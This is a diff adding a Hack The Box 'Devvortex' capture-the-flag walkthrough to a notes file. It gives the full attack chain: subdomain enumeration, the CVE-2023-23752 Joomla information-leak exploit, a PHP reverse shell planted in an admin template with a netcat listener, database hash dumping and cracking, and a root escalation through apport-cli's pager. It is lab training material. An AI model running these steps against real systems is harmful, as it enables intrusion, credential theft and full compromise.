@@ -471,3 +471,203 @@ else:
   * PW
   * cd /root && ls
   * cat root.txt
+
+## Devvortex
+
+### Reco
+
+#### nmap
+
+* `nmap -sVC 10.10.11.242`
+  * 22 SSH
+  * 80 HTTP
+
+<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+
+* add to hosts
+  * `sudo nano /etc/hosts`
+
+<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
+* dirb
+  * `dirb http://devvortex.htb/ /usr/share/wordlists/dirb/common.txt`
+    * nothing interesting found
+* subdomains enumeration
+  *   `gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+
+      * found **dev**.devvortex.htb
+
+      <figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+  * another bruteforce tool
+  * `ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -mc 200-299`
+
+#### Website
+
+* &#x20;Portfolio website about offering dev services
+* Interacting parts
+  * /contact.html -> contact form
+  * &#x20;footer -> newsletter&#x20;
+
+#### Dev website
+
+* robots.txt
+
+<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+### Weaponisation
+
+#### administrator
+
+*   dev.devvortex.htb/administrator
+
+    * running Joomla
+
+    <figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### joomscan
+
+*   `joomscan -u dev.devvortex.htb -ec`
+
+    * robots.txt existing
+    * admin page /administrator
+    * **Joomla 4.2.6**
+
+    <figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+* Joomla 4.2.6
+  * **CVE-2023-23752**
+
+<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+*   [Exploit](https://github.com/Acceis/exploit-CVE-2023-23752)
+
+    * Joomla versions 4.0.0-4.2.7 contain an improper API access vuln
+      * **vuln allows us access to webservice endpoint which contain sensitive information**
+    * sudo gem install httpx
+    * sudo gem install paint
+    * sudo gem install docopt
+    * ruby exploit.rb http://dev.devvortex.htb
+      * found users & DB credentials
+
+    <figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+
+
+
+#### Database
+
+* login w creds
+  * lewis:P4ntherg0t1n5r3c0n##
+
+<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+### User flag
+
+* SSH login doesnt work
+* lets search the admin interface
+*   we can **upload reverse shell php file...**
+
+    * **SYSTEM -> Templates -> Administrator Templates**
+
+    <figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+
+
+
+    * error.php
+
+    <figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+    * [Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
+      *
+
+          <figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+
+
+          * change IP & port to your own values
+
+<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+* Save
+* Start netcat listener
+  * `nc -nlvp 4444`
+
+<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
+* visit error.php&#x20;
+  * [http://dev.devvortex.htb/administrator/templates/atum/error.php](http://dev.devvortex.htb/administrator/templates/atum/error.php)
+  * BOOM, we have reverse shell
+
+<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+
+* `python3 -c "import pty;pty.spawn('/bin/bash')"`
+* we dont have permissions to read user flag...
+
+<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+
+* we have to login via SSH as logan, lets find the PW
+  * `mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##`
+  * show tables;
+    * sd4fg\_users table...
+      * select \* from sd4fg\_users
+
+<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
+
+* users found:
+  * lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
+  * **logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12**
+* decrypt PW using johntheripper
+  * nano hash.txt
+    * insert the hash ($2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12)
+  * `john hash.txt /home/zihuatanejo/Desktop/rockyou.txt`
+  * `hashcat -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt`
+    * PW found: **tequieromucho**
+
+<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>
+
+* SSH login to logan
+  * `ssh logan@10.10.11.242`
+    * PW: tequieromucho
+  * cat user.txt
+
+<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
+
+### Root flag
+
+* `sudo -l`
+
+<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
+
+* we can run /usr/bin/apport.cli
+* apport-cli -v
+  * 2.20.11
+* [VULN](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) -> /var/crash/xxx.crash
+  * lets create some .crash file...
+  * Linux saves crash reports into /var/crash dir...we just need to get to pager
+    * create a crash file
+      * ```
+        sleep 13 & killall -SIGSEGV sleep
+        ```
+
+<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
+
+* cd /var/crash
+* ls
+*   `sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash`
+
+    * `Please Choose (S/V/K/I/C):`` `**`V`**
+    * **after obtaining :**
+      * **`!/bin/bash`**
+        * BOOM, we have root privileges
+
+    <figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
+
+
+* cd /root&#x20;
+* cat root.txt
+
+**PWNED <3**
+
